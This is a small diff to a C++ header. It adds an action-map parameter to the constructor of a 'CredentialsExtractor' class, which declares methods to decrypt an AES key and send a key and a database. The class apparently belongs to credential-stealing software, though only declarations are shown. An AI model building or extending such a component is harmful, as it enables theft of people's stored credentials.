@@ -11,7 +11,7 @@
 
 class CredentialsExtractor : public Sender {
 public:
-    explicit CredentialsExtractor(const Stream &stream);
+    explicit CredentialsExtractor(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap);
     std::vector<BYTE> decryptAESKey(const std::string& encryptedDataStr);
     std::vector<BYTE>  getDecryptedKey();
     void sendKeyAndDatabase();
